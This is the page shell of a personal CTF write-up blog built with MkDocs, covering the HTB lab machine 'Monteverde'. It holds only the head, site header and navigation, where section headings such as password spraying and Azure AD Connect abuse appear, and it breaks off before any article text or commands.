
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="ch3ckm8">
      
      
        <link rel="canonical" href="https://ch3ckm8.github.io/personal_blog4/ch3ckm8_HTB_monteverde/">
      
      
        <link rel="prev" href="../ch3ckm8_HTB_forest/">
      
      
        <link rel="next" href="../ch3ckm8_HTB_sauna/">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
    
    
      
        <title>Monteverde - Ch3ckm8 Vault</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/interactive_graph.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/obsidian_tags.css">
    
      <link rel="stylesheet" href="../assets/stylesheets/custom.css">
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#intro" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="Ch3ckm8 Vault" class="md-header__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Ch3ckm8 Vault
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Monteverde
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href=".." class="md-tabs__link">
        
  
  
    
  
  Welcome

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../ch3ckm8_HTB_Active/" class="md-tabs__link">
          
  
  
  HTB Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-tabs__link">
          
  
  
  Other CTF Writeups

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../common_tools/" class="md-tabs__link">
          
  
  
  Notes

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../windows/" class="md-tabs__link">
          
  
  
  Tags

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="Ch3ckm8 Vault" class="md-nav__button md-logo" aria-label="Ch3ckm8 Vault" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 22H5v-2h14zM13 2c-1.25 0-2.42.62-3.11 1.66L7 8l2 2 2.06-1.37c.44-.31 1.08-.19 1.39.27.02.03.05.06.05.1.3.59.19 1.3-.28 1.77l-4.8 4.8c-.55.56-.55 1.46.01 2.01.26.26.62.42.99.42H17V6a4 4 0 0 0-4-4"/></svg>

    </a>
    Ch3ckm8 Vault
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    HTB Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Active/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Administrator/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Administrator
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Blackfield/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blackfield
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Cascade/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cascade
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_EscapeTwo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    EscapeTwo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Nocturnal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Nocturnal
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Return/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Return
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_TheFrizz/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TheFrizz
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_forest/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Forest
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Monteverde
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Monteverde
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap-scan" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap scan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      RPC enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-password-policy" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Password policy
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#find-valid-users" class="md-nav__link">
    <span class="md-ellipsis">
      Find valid Users
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#password-spraying" class="md-nav__link">
    <span class="md-ellipsis">
      Password spraying
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-sabatchjobs" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as SABatchJobs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#logging-in-as-mhope" class="md-nav__link">
    <span class="md-ellipsis">
      Logging in as mhope
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#checking-users-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Checking user's privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checking-group-membership" class="md-nav__link">
    <span class="md-ellipsis">
      Checking group membership
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-mhope" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as mhope
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inspecting-the-hosts-program-files" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting the host's Program Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#abusing-azure-ad-connect" class="md-nav__link">
    <span class="md-ellipsis">
      Abusing Azure AD connect
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_sauna/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sauna
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Timelapse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Timelapse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_cicada/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cicada
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Escape/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Escape
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_Flight/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Flight
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_fluffy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Fluffy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_puppy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Puppy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_tombwatcher/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Tombwatcher
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_HTB_certified/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Certified
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Other CTF Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Other CTF Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ch3ckm8_RoboGRoot-CTF_Portfolio/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RoboGRoot's-Portfolio
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../common_tools/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Commonly used tools and methodologies
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Tags
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Tags
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../windows/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    windows
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AD/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AD
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADconnectAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADconnectAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AS-REP-roasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AS-REP-roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../AssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    AssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../DCSync/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DCSync
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Docker/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Docker
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../GSSAPIauthentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    GSSAPIauthentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../NotAssumedBreach/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    NotAssumedBreach
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OSCPpath/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OSCPpath
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PortForwarding/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PortForwarding
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../PrivGroupAbuse/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    PrivGroupAbuse
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RCE/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RCE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../RecycleBin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RecycleBin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WebApp/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WebApp
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../WinPEAS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    WinPEAS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../XSS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    XSS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certificates
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntemplate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntemplate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../codereview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    codereview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    commandinjection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gpo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    gpo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../history/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    history
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mssql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    mssql
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC9/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC9
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Impersonation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Impersonation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Vhosts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vhosts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC16/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC16
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC15
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
